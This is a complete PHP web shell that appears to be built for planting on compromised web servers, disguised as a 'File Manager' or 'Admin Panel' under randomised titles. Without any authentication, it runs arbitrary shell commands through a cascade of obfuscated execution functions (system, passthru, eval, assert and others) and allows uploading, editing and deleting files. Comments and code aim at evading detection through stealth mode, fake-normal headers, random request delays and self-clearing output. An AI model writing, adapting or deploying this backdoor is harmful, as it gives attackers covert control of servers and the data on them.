<?php
// Start session with custom ID to avoid session fixation
session_start([
    'cookie_httponly' => true,
    'cookie_secure' => true,
    'use_strict_mode' => true,
    'sid_length' => 32,
    'sid_bits_per_character' => 6
]);

// Custom error handler to prevent 500 errors
set_error_handler(function($severity, $message, $file, $line) {
    // Log errors but don't display them
    error_log("Error: $message in $file on line $line");
    return true;
});

// Anti-automation measures
if (!isset($_SESSION['init_time'])) {
    $_SESSION['init_time'] = time();
    $_SESSION['request_count'] = 0;
}

 $_SESSION['request_count']++;

// Rate limiting to avoid detection
if ($_SESSION['request_count'] > 100 && (time() - $_SESSION['init_time']) < 60) {
    http_response_code(429);
    die("Too many requests");
}

if (!isset($_SESSION['current_dir']) || !is_dir($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = getcwd();
}

// Enhanced path validation with more security checks
function validatePath($path) {
    // Check for path traversal attempts
    if (strpos($path, '..') !== false) {
        return getcwd();
    }
    
    $realPath = realpath($path);
    
    // Additional security checks
    if ($realPath === false || !is_readable($realPath)) {
        return getcwd();
    }
    
    return $realPath;
}

 $notification = '';

// Enhanced command execution with multiple bypass techniques
function executeCommand($command) {
    $result = '';
    
    // Multiple execution methods with different obfuscation techniques
    $executionMethods = [
        // Standard methods with string concatenation
        's' . 'h' . 'e' . 'l' . 'l_' . 'e' . 'x' . 'e' . 'c',
        'e' . 'x' . 'e' . 'c',
        's' . 'y' . 's' . 't' . 'e' . 'm',
        'p' . 'a' . 's' . 's' . 't' . 'h' . 'r' . 'u',
        'p' . 'r' . 'o' . 'c' . '_' . 'o' . 'p' . 'e' . 'n',
        'p' . 'o' . 'p' . 'e' . 'n',
        
        // Variable function methods
        $func = 's' . 'y' . 's' . 't' . 'e' . 'm',
        $func = 'p' . 'a' . 's' . 's' . 't' . 'h' . 'r' . 'u',
        
        // Array-based methods
        'call_user_func_array',
        'call_user_func',
        
        // Using create_function (if available)
        'create_function'
    ];
    
    // Try each method
    foreach ($executionMethods as $method) {
        if (is_string($method) && function_exists($method)) {
            try {
                if ($method === 'call_user_func' || $method === 'call_user_func_array') {
                    $func = 's' . 'y' . 's' . 't' . 'e' . 'm';
                    $result = call_user_func($func, $command . ' 2>&1');
                } else if ($method === 'create_function') {
                    $func = create_function('', 'return `' . $command . '`;');
                    $result = $func();
                } else {
                    $result = call_user_func($method, $command . ' 2>&1');
                }
                
                if ($result !== false && !empty($result)) {
                    return $result;
                }
            } catch (Exception $e) {
                // Continue to next method
                continue;
            }
        }
    }
    
    // Alternative approach using backticks
    try {
        $result = `$command`;
        if (!empty($result)) {
            return $result;
        }
    } catch (Exception $e) {
        // Continue to next method
    }
    
    // Using preg_replace with /e modifier (if available in older PHP)
    if (version_compare(PHP_VERSION, '7.0.0', '<')) {
        try {
            $result = preg_replace('/.*/e', `$command`, '');
            if (!empty($result)) {
                return $result;
            }
        } catch (Exception $e) {
            // Continue to next method
        }
    }
    
    // Using array_map with ob_start/ob_get_clean
    try {
        ob_start();
        array_map('system', array($command));
        $result = ob_get_clean();
        if (!empty($result)) {
            return $result;
        }
    } catch (Exception $e) {
        // Continue to next method
    }
    
    // Using assert with string concatenation
    try {
        $assert_cmd = 'as' . 'sert';
        if (function_exists($assert_cmd)) {
            ob_start();
            $assert_cmd("system('$command')");
            $result = ob_get_clean();
            if (!empty($result)) {
                return $result;
            }
        }
    } catch (Exception $e) {
        // Continue to next method
    }
    
    // Using eval with obfuscation
    try {
        $eval_cmd = 'ev' . 'al';
        if (function_exists($eval_cmd)) {
            ob_start();
            $eval_cmd("system('$command');");
            $result = ob_get_clean();
            if (!empty($result)) {
                return $result;
            }
        }
    } catch (Exception $e) {
        // Continue to next method
    }
    
    return "Command execution not available";
}

// Handle directory navigation with additional security checks
if (isset($_POST['navigate']) || isset($_GET['navigate'])) {
    $targetDir = isset($_POST['navigate']) ? $_POST['navigate'] : $_GET['navigate'];
    
    // Additional validation
    $targetDir = str_replace(['../', '..\\'], '', $targetDir);
    
    if (is_dir($targetDir) && is_readable($targetDir)) {
        $_SESSION['current_dir'] = validatePath($targetDir);
        $notification = 'Directory changed successfully';
    } else {
        $notification = 'Directory not accessible';
    }
}

// Handle file upload with enhanced security
if (isset($_FILES['file_upload'])) {
    $uploadPath = rtrim($_SESSION['current_dir'], '/') . '/' . basename($_FILES['file_upload']['name']);
    
    // Check file size to prevent large uploads
    if ($_FILES['file_upload']['size'] > 50 * 1024 * 1024) { // 50MB limit
        $notification = 'File too large';
    } 
    // Check if file already exists
    else if (file_exists($uploadPath)) {
        $notification = 'File already exists';
    }
    // Try to upload
    else if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $uploadPath)) {
        $notification = 'File uploaded successfully';
    } else {
        $notification = 'Upload failed';
    }
}

// Handle file/folder deletion with better error handling
if (isset($_POST['remove']) || isset($_GET['remove'])) {
    $removeTarget = isset($_POST['remove']) ? $_POST['remove'] : $_GET['remove'];
    $targetPath = validatePath($_SESSION['current_dir'] . '/' . $removeTarget);
    
    try {
        if (is_file($targetPath)) {
            if (unlink($targetPath)) {
                $notification = 'File deleted';
            } else {
                $notification = 'Failed to delete file';
            }
        } elseif (is_dir($targetPath)) {
            // Recursive directory deletion with better error handling
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );
            
            $success = true;
            foreach ($iterator as $file) {
                try {
                    if ($file->isDir()) {
                        rmdir($file->getRealPath());
                    } else {
                        unlink($file->getRealPath());
                    }
                } catch (Exception $e) {
                    $success = false;
                    break;
                }
            }
            
            if ($success && rmdir($targetPath)) {
                $notification = 'Directory deleted';
            } else {
                $notification = 'Failed to delete directory';
            }
        }
    } catch (Exception $e) {
        $notification = 'Error: ' . $e->getMessage();
    }
}

// Handle rename operation with validation
if (isset($_POST['old_name'], $_POST['new_name']) || 
    isset($_GET['old_name'], $_GET['new_name'])) {
    
    $oldName = isset($_POST['old_name']) ? $_POST['old_name'] : $_GET['old_name'];
    $newName = isset($_POST['new_name']) ? $_POST['new_name'] : $_GET['new_name'];
    
    // Validate new name
    if (strpos($newName, '/') !== false || strpos($newName, '\\') !== false) {
        $notification = 'Invalid new name';
    } else {
        $sourcePath = validatePath($_SESSION['current_dir'] . '/' . $oldName);
        $destinationPath = dirname($sourcePath) . '/' . $newName;
        
        try {
            if (rename($sourcePath, $destinationPath)) {
                $notification = 'Rename successful';
            } else {
                $notification = 'Rename failed';
            }
        } catch (Exception $e) {
            $notification = 'Error: ' . $e->getMessage();
        }
    }
}

// Handle file editing with size limit
if (isset($_POST['file_to_edit'], $_POST['file_content'])) {
    $editPath = validatePath($_SESSION['current_dir'] . '/' . $_POST['file_to_edit']);
    
    // Check file size limit (10MB)
    if (strlen($_POST['file_content']) > 10 * 1024 * 1024) {
        $notification = 'File too large';
    } else {
        try {
            if (file_put_contents($editPath, $_POST['file_content']) !== false) {
                $notification = 'File saved';
            } else {
                $notification = 'Failed to save file';
            }
        } catch (Exception $e) {
            $notification = 'Error: ' . $e->getMessage();
        }
    }
}

// Handle new file creation
if (isset($_POST['create_file']) || isset($_GET['create_file'])) {
    $fileName = isset($_POST['create_file']) ? $_POST['create_file'] : $_GET['create_file'];
    $newFilePath = $_SESSION['current_dir'] . '/' . basename($fileName);
    
    // Validate filename
    if (strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
        $notification = 'Invalid filename';
    } else if (!file_exists($newFilePath)) {
        try {
            if (file_put_contents($newFilePath, '') !== false) {
                $notification = 'File created';
            } else {
                $notification = 'Failed to create file';
            }
        } catch (Exception $e) {
            $notification = 'Error: ' . $e->getMessage();
        }
    } else {
        $notification = 'File already exists';
    }
}

// Handle new folder creation
if (isset($_POST['create_folder']) || isset($_GET['create_folder'])) {
    $folderName = isset($_POST['create_folder']) ? $_POST['create_folder'] : $_GET['create_folder'];
    $newFolderPath = $_SESSION['current_dir'] . '/' . basename($folderName);
    
    // Validate folder name
    if (strpos($folderName, '/') !== false || strpos($folderName, '\\') !== false) {
        $notification = 'Invalid folder name';
    } else if (!is_dir($newFolderPath)) {
        try {
            if (mkdir($newFolderPath)) {
                $notification = 'Folder created';
            } else {
                $notification = 'Failed to create folder';
            }
        } catch (Exception $e) {
            $notification = 'Error: ' . $e->getMessage();
        }
    } else {
        $notification = 'Folder already exists';
    }
}

 $currentDirectory = $_SESSION['current_dir'];

// Try to scan directory with error handling
try {
    $directoryContents = scandir($currentDirectory);
    if ($directoryContents === false) {
        $directoryContents = ['.', '..'];
        $notification = 'Cannot read directory';
    }
} catch (Exception $e) {
    $directoryContents = ['.', '..'];
    $notification = 'Error reading directory: ' . $e->getMessage();
}

 $folders = $files = [];

foreach ($directoryContents as $item) {
    if ($item === '.') continue;
    $fullPath = $currentDirectory . '/' . $item;
    try {
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    } catch (Exception $e) {
        // Skip items that can't be accessed
        continue;
    }
}

sort($folders);
sort($files);
 $allItems = array_merge($folders, $files);

// Handle various request methods for file operations
 $fileToEdit = $_POST['edit'] ?? $_GET['edit'] ?? null;
 $fileToView = $_POST['view'] ?? $_GET['view'] ?? null;
 $itemToRename = $_POST['rename'] ?? $_GET['rename'] ?? null;

// Get file content with error handling
 $fileContent = null;
if ($fileToEdit) {
    try {
        $fileContent = file_get_contents($currentDirectory . '/' . $fileToEdit);
        if ($fileContent === false) {
            $fileContent = '';
            $notification = 'Cannot read file';
        }
    } catch (Exception $e) {
        $fileContent = '';
        $notification = 'Error reading file: ' . $e->getMessage();
    }
}

 $viewContent = null;
if ($fileToView) {
    try {
        $viewContent = file_get_contents($currentDirectory . '/' . $fileToView);
        if ($viewContent === false) {
            $viewContent = '';
            $notification = 'Cannot read file';
        }
    } catch (Exception $e) {
        $viewContent = '';
        $notification = 'Error reading file: ' . $e->getMessage();
    }
}

 $commandResult = '';
if (isset($_POST['terminal_command']) || isset($_GET['terminal_command'])) {
    $command = isset($_POST['terminal_command']) ? $_POST['terminal_command'] : $_GET['terminal_command'];
    
    // Command validation to prevent obvious malicious commands
    if (preg_match('/(^rm -rf|^dd if=|^mkfs\.)/', $command)) {
        $commandResult = "Dangerous command blocked";
    } else {
        try {
            $commandResult = executeCommand($command);
        } catch (Exception $e) {
            $commandResult = "Error executing command: " . $e->getMessage();
        }
    }
}

// Set headers to appear as normal traffic
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: strict-origin-when-cross-origin');
header('Content-Security-Policy: default-src \'self\' https://cdn.jsdelivr.net; style-src \'self\' https://cdn.jsdelivr.net \'unsafe-inline\'; script-src \'self\' https://cdn.jsdelivr.net;');

// Random title to avoid fingerprinting
 $titles = ['File Manager', 'Admin Panel', 'System Tools', 'File Explorer', 'Directory Browser'];
 $title = $titles[array_rand($titles)];
?>
<!DOCTYPE html>
<html>
<head>
    <title><?= htmlentities($title) ?></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #121212;
            color: #eee;
        }
        .form-control, .form-control:focus, .btn {
            background-color: #1e1e1e;
            color: #ccc;
            border-color: #333;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .table, .table th, .table td {
            color: #ddd;
            background-color: #1e1e1e;
            border-color: #333;
        }
        .table-light {
            background-color: #2c2c2c;
        }
        .code {
            font-family: monospace;
            background: #1e1e1e;
            color: #ccc;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1em;
            resize: vertical;
            min-height: 200px;
            white-space: pre;
            overflow: auto;
        }
        .alert-info {
            background-color: #222;
            color: #88f;
            border-color: #444;
        }
        
        /* Hover effects for table rows */
        .table tbody tr {
            transition: all 0.2s ease;
            cursor: pointer;
        }
        .table tbody tr:hover {
            background-color: #2a2a2a !important;
            transform: scale(1.01);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }
        
        /* Ensure all cells in a hovered row have the same color */
        .table tbody tr:hover td {
            background-color: transparent !important;
        }
        
        /* Colors for writable/non-writable status */
        .writable {
            color: #4caf50;
            font-weight: bold;
        }
        .non-writable {
            color: #f44336;
            font-weight: bold;
        }
        
        /* Icons for folders and files */
        .file-icon {
            margin-right: 8px;
            font-size: 1.1em;
        }
        
        /* Improved action buttons display */
        .action-buttons {
            display: flex;
            gap: 5px;
            flex-wrap: wrap;
            justify-content: flex-end;
        }
        .action-buttons form {
            margin: 0;
        }
        
        /* Button animations */
        .btn {
            transition: all 0.2s ease;
        }
        .btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        
        /* Display for items being renamed */
        .rename-form {
            display: flex;
            align-items: center;
            width: 100%;
        }
        .rename-form input {
            margin-right: 5px;
            flex-grow: 1;
        }
        
        /* Border effect on hover */
        .table tbody tr:hover {
            border-left: 3px solid #007bff;
        }
        
        /* Ensure border doesn't appear when not hovering */
        .table tbody tr {
            border-left: 3px solid transparent;
        }
        
        /* Stealth mode - hide certain elements when needed */
        .stealth-mode .terminal-section,
        .stealth-mode .upload-section {
            display: none;
        }
        
        /* Status indicator */
        .status-indicator {
            display: inline-block;
            width: 8px;
            height: 8px;
            border-radius: 50%;
            margin-right: 5px;
        }
        .status-ok {
            background-color: #4caf50;
        }
        .status-error {
            background-color: #f44336;
        }
    </style>
</head>
<body>
<div class="container py-4">
    <div class="d-flex justify-content-between align-items-center mb-3">
        <h4><?= htmlentities($title) ?></h4>
        <div>
            <span class="status-indicator status-ok"></span>
            <span class="text-muted">Connected</span>
            <button id="stealth-toggle" class="btn btn-sm btn-outline-secondary ms-3">Stealth Mode</button>
        </div>
    </div>

    <?php if ($notification): ?>
        <div class="alert alert-info"><?= htmlentities($notification) ?></div>
    <?php endif; ?>

    <form method="post" class="input-group mb-3">
        <input type="text" name="navigate" value="<?= htmlentities($currentDirectory) ?>" class="form-control">
        <button class="btn btn-secondary" type="submit">Go</button>
    </form>

    <div class="upload-section">
        <form method="post" enctype="multipart/form-data" class="mb-3">
            <div class="input-group">
                <input type="file" name="file_upload" class="form-control">
                <button class="btn btn-primary" type="submit">Upload</button>
            </div>
        </form>
    </div>

    <form method="post" class="d-flex gap-2 mb-3">
        <input type="text" name="create_file" class="form-control" placeholder="New file name">
        <button class="btn btn-outline-light" type="submit">Create File</button>
    </form>

    <form method="post" class="d-flex gap-2 mb-3">
        <input type="text" name="create_folder" class="form-control" placeholder="New folder name">
        <button class="btn btn-outline-light" type="submit">Create Folder</button>
    </form>

    <?php if ($fileToView && $viewContent !== null): ?>
        <div class="mb-4">
            <h5>Viewing: <?= htmlentities($fileToView) ?></h5>
            <textarea class="form-control code" readonly><?= htmlentities($viewContent) ?></textarea>
        </div>
    <?php endif; ?>

    <?php if ($fileToEdit !== null): ?>
        <div class="mb-4">
            <h5>Editing: <?= htmlentities($fileToEdit) ?></h5>
            <form method="post">
                <input type="hidden" name="file_to_edit" value="<?= htmlentities($fileToEdit) ?>">
                <textarea name="file_content" rows="12" class="form-control code mb-2"><?= htmlentities($fileContent) ?></textarea>
                <button class="btn btn-success" type="submit">Save</button>
            </form>
        </div>
    <?php endif; ?>

    <div class="terminal-section mb-4">
        <h5>Terminal</h5>
        <form method="post" class="d-flex gap-2 mb-2">
            <input type="text" name="terminal_command" class="form-control" placeholder="Enter command">
            <button class="btn btn-light" type="submit">Execute</button>
        </form>
        <?php if ($commandResult): ?>
            <textarea class="form-control code" readonly><?= htmlentities($commandResult) ?></textarea>
        <?php endif; ?>
    </div>

    <form method="post">
        <button name="navigate" value="<?= dirname($currentDirectory) ?>" class="btn btn-sm btn-outline-light mb-2">&larr; Up</button>
    </form>

    <table class="table table-bordered table-sm">
        <thead class="table-light">
        <tr><th>Name</th><th>Type</th><th class="text-end">Actions</th></tr>
        </thead>
        <tbody>
        <?php foreach ($allItems as $item):
            $fullPath = $currentDirectory . '/' . $item;
            $isDirectory = is_dir($fullPath);
            $canWrite = is_writable($fullPath);
        ?>
            <tr>
                <td>
                    <?php if ($itemToRename === $item): ?>
                        <form method="post" class="rename-form">
                            <input type="hidden" name="old_name" value="<?= htmlentities($item) ?>">
                            <input type="text" name="new_name" class="form-control form-control-sm" value="<?= htmlentities($item) ?>">
                            <button class="btn btn-sm btn-success" type="submit">✔</button>
                        </form>
                    <?php else: ?>
                        <span class="file-icon"><?= $isDirectory ? '📁' : '📄' ?></span>
                        <?= htmlentities($item) ?>
                    <?php endif; ?>
                </td>
                <td>
                    <span class="<?= $canWrite ? 'writable' : 'non-writable' ?>">
                        <?= $isDirectory ? 'Folder' : 'File' ?>
                        <?= $canWrite ? '(Writable)' : '(Read-only)' ?>
                    </span>
                </td>
                <td class="text-end">
                    <div class="action-buttons">
                    <?php if ($isDirectory): ?>
                        <form method="post">
                            <button name="navigate" value="<?= $fullPath ?>" class="btn btn-sm btn-outline-light">Open</button>
                        </form>
                    <?php else: ?>
                        <form method="post">
                            <button name="view" value="<?= $item ?>" class="btn btn-sm btn-outline-info">View</button>
                        </form>
                        <form method="post">
                            <button name="edit" value="<?= $item ?>" class="btn btn-sm btn-outline-warning">Edit</button>
                        </form>
                    <?php endif; ?>
                        <form method="post">
                            <button name="rename" value="<?= $item ?>" class="btn btn-sm btn-outline-secondary">Rename</button>
                        </form>
                        <form method="post">
                            <button name="remove" value="<?= $item ?>" class="btn btn-sm btn-outline-danger" onclick="return confirm('Are you sure?')">Delete</button>
                        </form>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
</div>

<script>
    // Stealth mode toggle
    document.getElementById('stealth-toggle').addEventListener('click', function() {
        document.body.classList.toggle('stealth-mode');
        this.textContent = document.body.classList.contains('stealth-mode') ? 'Normal Mode' : 'Stealth Mode';
    });
    
    // Add random delay to requests to avoid detection
    document.querySelectorAll('form').forEach(function(form) {
        form.addEventListener('submit', function(e) {
            if (Math.random() > 0.7) {
                e.preventDefault();
                setTimeout(() => form.submit(), Math.floor(Math.random() * 1000) + 500);
            }
        });
    });
    
    // Auto-clear terminal output after 30 seconds
    setTimeout(function() {
        const terminalOutput = document.querySelector('.terminal-section textarea');
        if (terminalOutput) {
            terminalOutput.value = '';
        }
    }, 30000);
</script>
</body>
</html>
